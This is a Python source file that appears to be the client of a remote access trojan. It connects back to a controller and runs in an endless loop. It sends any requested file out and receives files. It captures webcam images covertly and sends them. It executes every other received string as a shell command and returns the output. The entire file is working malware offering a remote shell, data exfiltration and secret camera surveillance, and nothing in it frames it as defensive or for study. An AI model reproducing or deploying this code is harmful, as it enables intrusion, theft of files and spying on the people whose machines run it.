import revnet
import cv2
import os
import subprocess
import time
import string
import random

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
	return ''.join(random.choice(chars) for _ in range(size))

Conn=revnet.ClientConn('localhost',9999)

while True:

	CurrentDir=os.getcwd()
	Conn.sendstring(CurrentDir)
	Command=Conn.recvstring()

	if Command=='exit':

		Conn.close()
		exit()

	elif Command[0:4]=='fget':

		try:

			f=open(Command[5:],'rb')
			f.close()
			Ack='Successful'

		except:

			Ack='Bad'

		Conn.sendstring(Ack)
		Conn.sendfile(Command[5:])

	elif Command[0:6]=='ftrans':

		Ack=Conn.recvstring()

		if Ack!='Bad':

			Conn.recvfile(Command[7:])
			print('received')

	elif Command[0:7]=='wc_snap':

		try:

			Camera=cv2.VideoCapture(0)
			time.sleep(0.5)
			ret,img=Camera.read()
			time.sleep(0.5)
			File=id_generator()+'.png'
			cv2.imwrite(File,img)
			del Camera
			Conn.sendstring(File)
			Conn.sendfile(File)

		except:

			Conn.sendstring('Bad')

	elif Command[0:2]=='cd':

		try:

			os.chdir(Command[3:])
		except:
			pass
		Conn.sendstring(os.getcwd())

	else:

		Exec=subprocess.Popen(Command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
		ExecOut=Exec.stdout.read()+Exec.stderr.read()
		ExecOut=ExecOut.decode()
		Conn.sendstring(ExecOut)
